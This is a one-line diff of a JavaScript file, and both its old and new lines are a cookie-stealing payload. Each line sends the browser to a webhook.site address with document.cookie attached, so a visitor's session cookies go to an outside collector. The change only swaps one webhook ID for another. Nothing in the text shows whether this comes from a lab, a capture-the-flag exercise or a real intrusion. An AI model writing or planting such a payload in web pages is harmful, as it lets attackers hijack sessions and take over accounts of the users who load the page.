@@ -1,1 +1,1 @@
-window.location = 'https://webhook.site/d5fbde3e-5233-4aa5-831a-2a8633281550?cookie=' + encodeURIComponent(document.cookie);
+window.location = 'https://webhook.site/44f15767-2ee2-41c9-bee2-9a4f4c07f801?cookie=' + encodeURIComponent(document.cookie);
